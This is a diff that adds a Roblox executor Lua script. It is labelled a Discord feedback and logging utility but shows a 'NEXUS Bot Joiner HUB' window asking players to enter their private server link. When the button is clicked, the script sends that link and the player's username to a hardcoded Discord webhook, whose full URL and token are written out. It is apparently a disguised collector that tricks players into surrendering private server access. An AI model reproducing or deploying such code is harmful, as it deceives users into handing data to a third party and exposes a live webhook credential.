@@ -1,0 +1,166 @@
+-- =====================================================================
+-- NEXUS DISCORD FEEDBACK & LOGGING UTILITY
+-- =====================================================================
+
+if not game:IsLoaded() then
+    game.Loaded:Wait()
+end
+
+-- Clean up any prior instances of this specific interface
+if game:GetService("CoreGui"):FindFirstChild("NexusFeedbackHub") then
+    game:GetService("CoreGui").NexusFeedbackHub:Destroy()
+end
+
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
+
+local player = Players.LocalPlayer
+
+-- !!! PLACE YOUR DISCORD WEBHOOK URL IN THE STRING BELOW !!!
+local DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1517657542753386750/BhP1Bs5tOwHpTFpo5-S7XCmxNIiuSMk1O3mDrFcbENZ7LVYF3IBka11Qd2VDBDU4AuEM"
+
+-- ================= INTERFACE CONFIGURATION =================
+local ScreenGui = Instance.new("ScreenGui", game.CoreGui)
+ScreenGui.Name = "NexusFeedbackHub"; ScreenGui.ResetOnSpawn = false
+
+local MainFrame = Instance.new("Frame", ScreenGui)
+MainFrame.Name = "MainFrame"
+MainFrame.Size = UDim2.new(0, 260, 0, 180)
+MainFrame.Position = UDim2.new(0.5, -130, 0.4, -90)
+MainFrame.BackgroundColor3 = Color3.fromRGB(24, 24, 30)
+MainFrame.BorderSizePixel = 0
+Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0, 8)
+
+local MainStroke = Instance.new("UIStroke", MainFrame)
+MainStroke.Thickness = 1.5
+MainStroke.Color = Color3.fromRGB(88, 101, 242) -- Discord Blurple color theme
+
+-- Header Bar
+local Header = Instance.new("Frame", MainFrame)
+Header.Size = UDim2.new(1, 0, 0, 32)
+Header.BackgroundColor3 = Color3.fromRGB(32, 32, 42)
+Header.BorderSizePixel = 0
+Instance.new("UICorner", Header).CornerRadius = UDim.new(0, 8)
+
+local Title = Instance.new("TextLabel", Header)
+Title.Size = UDim2.new(1, -10, 1, 0)
+Title.Position = UDim2.new(0, 10, 0, 0)
+Title.BackgroundTransparency = 1
+Title.Text = "NEXUS Bot Joiner HUB"
+Title.TextColor3 = Color3.fromRGB(240, 240, 245)
+Title.Font = Enum.Font.GothamBold
+Title.TextSize = 11
+Title.TextXAlignment = Enum.TextXAlignment.Left
+
+-- Text Input Box
+local TextBox = Instance.new("TextBox", MainFrame)
+TextBox.Size = UDim2.new(0.9, 0, 0, 70)
+TextBox.Position = UDim2.new(0.05, 0, 0.25, 0)
+TextBox.BackgroundColor3 = Color3.fromRGB(32, 32, 42)
+TextBox.BorderSizePixel = 0
+TextBox.Text = ""
+TextBox.PlaceholderText = "Type your Private Server here..."
+TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextBox.PlaceholderColor3 = Color3.fromRGB(110, 110, 125)
+TextBox.Font = Enum.Font.GothamMedium
+TextBox.TextSize = 12
+TextBox.TextWrapped = true
+TextBox.TextYAlignment = Enum.TextYAlignment.Top
+TextBox.TextXAlignment = Enum.TextXAlignment.Left
+TextBox.ClearTextOnFocus = false
+Instance.new("UICorner", TextBox).CornerRadius = UDim.new(0, 6)
+
+local BoxStroke = Instance.new("UIStroke", TextBox)
+BoxStroke.Color = Color3.fromRGB(45, 45, 55)
+
+-- Submit Button
+local SendButton = Instance.new("TextButton", MainFrame)
+SendButton.Size = UDim2.new(0.9, 0, 0, 32)
+SendButton.Position = UDim2.new(0.05, 0, 0.72, 0)
+SendButton.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
+SendButton.BorderSizePixel = 0
+SendButton.Text = "📤 Confirm it!"
+SendButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+SendButton.Font = Enum.Font.GothamBold
+SendButton.TextSize = 11
+Instance.new("UICorner", SendButton).CornerRadius = UDim.new(0, 6)
+
+-- ================= DATA TRANSMISSION LOGIC =================
+local isSending = false
+
+SendButton.MouseButton1Click:Connect(function()
+    local inputMessage = TextBox.Text
+    
+    -- Ensure the message has content and the script isn't currently waiting on a request
+    if inputMessage == "" or isSending then return end
+    if DISCORD_WEBHOOK_URL == "YOUR_DISCORD_WEBHOOK_URL_HERE" then
+        SendButton.Text = "⚠️ Config Missing: Webhook URL required"
+        task.delay(3, function() SendButton.Text = "📤 TRANSMIT TO DISCORD" end)
+        return
+    end
+    
+    isSending = true
+    SendButton.Text = "⏳ Serializing Payload..."
+    SendButton.BackgroundColor3 = Color3.fromRGB(60, 70, 170)
+    
+    -- Constructing a standard webhook payload dictionary
+    local payloadData = {
+        ["username"] = "Nexus System Logger",
+        ["content"] = ("**[Log Event Details]**\n**User:** %s\n**Message:** %s"):format(player.Name, inputMessage)
+    }
+    
+    -- Safely process the HTTP POST request asynchronously 
+    task.spawn(function()
+        local requestFunc = (syn and syn.request) or request or http_request or (http and http.request)
+        
+        if requestFunc then
+            local success, response = pcall(function()
+                return requestFunc({
+                    Url = DISCORD_WEBHOOK_URL,
+                    Method = "POST",
+                    Headers = {
+                        ["Content-Type"] = "application/json"
+                    },
+                    Body = HttpService:JSONEncode(payloadData)
+                })
+            end)
+            
+            if success then
+                SendButton.Text = "✅ Sent"
+                SendButton.BackgroundColor3 = Color3.fromRGB(45, 175, 90)
+                TextBox.Text = "" -- Clear out data field on completion
+            else
+                SendButton.Text = "❌ REQUEST FAILED"
+                SendButton.BackgroundColor3 = Color3.fromRGB(200, 60, 60)
+            end
+        else
+            SendButton.Text = "❌ Executor Missing Request Support"
+            SendButton.BackgroundColor3 = Color3.fromRGB(200, 60, 60)
+        end
+        
+        -- Reset control flags back to baseline status
+        task.wait(3)
+        SendButton.Text = "📤 TRANSMIT TO DISCORD"
+        SendButton.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
+        isSending = false
+    end)
+end)
+
+-- Draggable UI layout helper framework
+local function setupDraggable(targetFrame, dragSurface)
+    local dragging, dragInput, dragStart, startPos
+    dragSurface.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 then
+            dragging = true; dragStart = input.Position; startPos = targetFrame.Position
+        end
+    end)
+    UserInputService.InputChanged:Connect(function(input)
+        if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
+            local delta = input.Position - dragStart
+            targetFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+        end
+    end)
+    UserInputService.InputEnded:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end end)
+end
+setupDraggable(MainFrame, Header)
